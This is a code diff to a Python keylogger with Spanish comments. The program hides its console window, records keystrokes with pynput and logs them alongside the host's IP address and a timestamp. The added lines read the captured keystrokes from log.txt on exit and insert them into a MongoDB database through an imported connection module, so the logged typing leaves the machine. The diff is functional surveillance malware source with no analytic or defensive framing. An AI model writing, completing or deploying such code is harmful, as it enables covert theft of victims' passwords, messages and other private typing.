@@ -4,6 +4,8 @@ import win32gui
 import pynput.keyboard
 import socket
 from datetime import datetime
+from mongobd import conexion
+import pymongo
 #trabajar con palabras
 
 ventana = win32console.GetConsoleWindow()
@@ -22,6 +24,7 @@ def presiona(key):
     if key1 == "Key.esc":
         print("Saliendo...")
         imprimir()
+        extrar_informacion()
         return False
     #Si es igual al espacio
     elif key1 == "Key.space":
@@ -41,6 +44,27 @@ def convertir(key):
         return key.char
     else:
         return str(key)
+
+def extrar_informacion():
+    equipo=""
+    fecha_hora=""
+    informacion=""
+    contador = 0
+    with open("log.txt", "r") as archivo:
+        for linea in archivo:
+            if contador == 0:
+                equipo = linea
+            elif contador == 1:
+                fecha_hora = linea
+            else:
+                informacion = informacion + linea
+            contador = contador + 1
+    agregarBD_mongo(equipo,fecha_hora,informacion)
+
+def agregarBD_mongo(equipo,fecha_hora,informacion):
+    mongo_conexion = conexion()
+    mongo_conexion.agregar_archivo(equipo,fecha_hora,informacion)
+
 #IP del equipo
 lista_tecla.append(socket.gethostbyname(socket.gethostname())+"\n")
 #Hora de ejecucion del programa
